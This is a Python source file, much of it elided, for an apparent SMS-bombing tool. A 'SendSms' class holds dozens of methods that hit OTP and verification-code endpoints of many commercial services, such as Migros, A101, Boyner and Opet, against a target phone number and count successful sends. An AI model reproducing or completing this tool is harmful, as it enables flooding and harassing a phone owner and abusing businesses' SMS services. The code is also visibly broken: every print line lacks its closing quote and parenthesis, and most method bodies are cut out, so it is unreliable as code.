...
class SendSms():
    ...
    def Dsmartgo(self):
        ...
        try:
            ...
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> dsmartgo.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
        except AttributeError:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> dsmartgo.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
            self.adet += 1
    ...
    def Kigili(self):    
        try:
            ...
            if kigili.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> kigili.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> kigili.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def KahveDunyasi(self):    
        try:    
            ...
            if len(kahve_dunyasi.json()["meta"]["messages"]["error"]) == 0:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> core.kahvedunyasi.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:    
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> core.kahvedunyasi.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def NaosStars(self):
        try:
            ...
            if naosstars.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> shop.naosstars.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1 
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> shop.naosstars.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Wmf(self):
        try:
            ...
            if wmf.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1   
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def IsteGelsin(self):
        try:
            ...
            if (r.json()["data"]["sendOtp2"]["alreadySent"]) == False:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> prod.fasapi.net | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> prod.fasapi.net | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Bim(self):
        try:
            ...
            if bim.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bim.veesk.net | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bim.veesk.net | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Sok(self):
        try:
            ...
            if len(r.json()["meta"]["messages"]["success"]) != 0:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.ceptesok.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.ceptesok.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Tiklagelsin(self):
        try:
            ...
            if tiklagelsin.json()["data"]["generateOtp"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> svc.apps.tiklagelsin.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> svc.apps.tiklagelsin.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Migros(self):
        try:
            ...
            if migros.json()["successful"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> rest.migros.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> rest.migros.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def A101(self):
        try:
            ...
            if (r.status_code) == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> a101.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise 
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> a101.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Englishhome(self):
        try:
            ...
            if home.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> englishhome.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> englishhome.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Sakasu(self):
        try:
            ...
            if su.json()["status"] == "ok":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> sakasu.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> sakasu.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Rentiva(self): 
        try:
            ...
            if rentiva.json()["success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> rentiva.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> rentiva.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Bineq(self):
        try:
            ...
            if bineq.json()["IsSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bineqapi.heymobility.tech | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bineqapi.heymobility.tech | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Link(self):
        try:
            ...
            if link.json()["detail"] == "Ok":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> consumer-auth.linkfleet.de | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> consumer-auth.linkfleet.de | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Lonca(self):
        try:
            ...
            if lonca.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> loncamarket.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> loncamarket.com | Sevgiyle Yapıldı! Tesekkürler Deluxe   
    ...
    def Dgn(self):
        try:
            ...
            if dgn.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> odeme.dgnonline.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> odeme.dgnonline.com | Sevgiyle Yapıldı! Tesekkürler Deluxe  
    ...
    def Yaani(self):
        try:
            ...
            if r.status_code == 204:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.yaanimail.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.yaanimail.com | Sevgiyle Yapıldı! Tesekkürler Deluxe  
    ...
    def Defacto(self):
        try:
            ...
            if r.json()["Data"]["IsSMSSend"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> defacto.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> defacto.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Mopas(self):
        try:
            ...
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mopas.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mopas.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Icq(self):
        try:
            ...
            if r.json()["status"]["code"] == 20000:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> u.icq.net | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> u.icq.net | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Boyner(self):
        try:
            ...
            if r.json()["Success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> boyner.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> boyner.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Watsons(self):
        try:
            ...
            if r.status_code == 201:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> watsons.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> watsons.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Buyur(self):
        try:
            ...
            r = requests.post(url, headers=headers, data=data)
            if (r.status_code) == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> app.buyursungelsin.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> app.buyursungelsin.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Osmanlideal(self):
        try:
            ...
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> osmgck.idealdata.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> osmgck.idealdata.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Pinar(self):
        try:
            ...
            r = requests.post(url, headers=headers, json=json)
            if r.text == "true":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> pinarsumobileservice.yasar.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> pinarsumobileservice.yasar.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Suiste(self):
        try:
            ...
            if r.json()["code"] == "common.success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> suiste.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> suiste.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Hayat(self):
        try:
            ...
            if (r.json()["IsSuccessful"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> hayatsu.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> hayatsu.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Pisir(self):
        try:
            ...
            if r.json()["ok"] == "1":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.pisir.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.pisir.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def KimGb(self):
        try:
            ...
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def IkinciYeni(self):
        try:
            ...
            if (r.json()["isSucceed"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> apigw.ikinciyeni.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> apigw.ikinciyeni.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Terra(self):
        try:
            ...
            r = requests.post(url,  json=json)
            if (r.status_code) == 201:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.terrapizza.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.terrapizza.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def IpraGaz(self):
        try:
            ...
            if (r.json()["phoneNumber"]) == str(self.phone):
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ipapp.ipragaz.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ipapp.ipragaz.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Mogaz(self):
        try:
            ...
            if (r.json()["messageCode"]) == "OK":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mogazmobilapinew.aygaz.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mogazmobilapinew.aygaz.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def GoMobile(self):
        try:
            ...
            if (r.json()["data"]["success"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gomobilapp.ipragaz.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gomobilapp.ipragaz.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def PetrolOfisi(self):
        try:
            ...
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 204:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobilapi.petrolofisi.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobilapi.petrolofisi.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Total(self):
        try:
            ...
            if (r.json()["success"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapi.totalistasyonlari.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapi.totalistasyonlari.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Opet(self):
        try:
            ...
            r = requests.post(url, json=json)
            if (r.status_code) == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.opet.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.opet.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Dolap(self):
        try:
            ...
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api-gateway.dolap.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api-gateway.dolap.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Hey(self):
        try:
            ...
            if (r.json()["IsSuccess"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> heyapi.heymobility.tech | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> heyapi.heymobility.tech | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Tazi(self):
        try:
            ...
            r = requests.post(url, headers=headers, json=json)
            if (r.json()["kod"]) == "0000":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapiv2.tazi.tech | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapiv2.tazi.tech | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Isbike(self):
        try:
            ...
            if (r.json()["sonuc"]["aciklama"]) == "İşlem Başarılı":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> app.isbike.istanbul | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> app.isbike.istanbul | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def N11(self):
        try:
            ...
            r = requests.post(url, headers=headers, json=json)
            if (r.json()["isSuccess"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapi.n11.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapi.n11.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Joker(self):
        try:
            ...
            r = requests.post(url, headers=headers, data=data)
            if (r.json()["success"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> joker.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> joker.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Ebebek(self):
        try:
            ...
            if r.json()["status"] == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api2.e-bebek.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api2.e-bebek.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Saka(self):
        try:
            ...
            r = requests.post(url, json=json)
            if (r.json()["status"]) == 1 :
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobilcrm2.saka.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobilcrm2.saka.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Gofody(self):
        try:
            ...
            r = requests.post(url, json=json)
            if (r.json()["success"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> backend.gofody.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> backend.gofody.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Madame(self):
        try:
            ...
            if (r.status_code) == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> madamecoco.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> madamecoco.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Buludag(self):
        try:
            ...
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bilet.balikesiruludag.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bilet.balikesiruludag.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe   
    ...
    def Evidea(self):
        try:
            ...
            r = requests.post(url, headers=headers, data=data)      
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> evidea.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> evidea.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Koctas(self):
        try:
            ...
            if (r.json()["status"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> occ2.koctas.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> occ2.koctas.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Gratis(self):
        try:
            ...
            r = requests.post(url, headers=headers, json=json)
            if (r.status_code) == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ivt.mobildev.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ivt.mobildev.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Anadolu(self):
        try:
            ...
            r = requests.get(url)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> anadolu.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> anadolu.com.tr | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Accordors(self):
        try:
            ...
            r = requests.post(url, json=json)
            if r.json()["data"]:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> aouws.accordors.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> aouws.accordors.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Marti(self):
        try:
            ...
            r = requests.post(url,  json=json)
            if r.json()["isSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> customer.martiscooter.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> customer.martiscooter.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Hop(self):
        try:
            ...
            r = requests.post(url,  json=json)
            if r.status_code == 201:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.hoplagit.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.hoplagit.com | Sevgiyle Yapıldı! Tesekkürler Deluxe
    ...
    def Karma(self):
        try:
            ...
            r = requests.post(url,  json=json)
            if r.status_code == 201:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.gokarma.app | Sevgiyle Yapıldı! Tesekkürler Deluxe
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.gokarma.app | Sevgiyle Yapıldı! Tesekkürler Deluxe
